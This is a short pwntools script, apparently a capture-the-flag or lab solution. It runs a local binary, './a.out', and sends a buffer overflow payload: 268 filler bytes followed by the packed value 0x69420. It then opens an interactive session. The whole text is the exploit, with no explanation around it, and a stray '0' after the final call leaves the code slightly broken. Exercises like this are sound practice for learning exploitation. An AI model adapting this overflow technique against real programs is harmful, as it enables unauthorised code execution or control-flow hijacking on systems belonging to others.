from pwn import *
p=process("./a.out")
payload = b'a'*268+p32(0x69420)
p.sendline(payload)
p.interactive()0
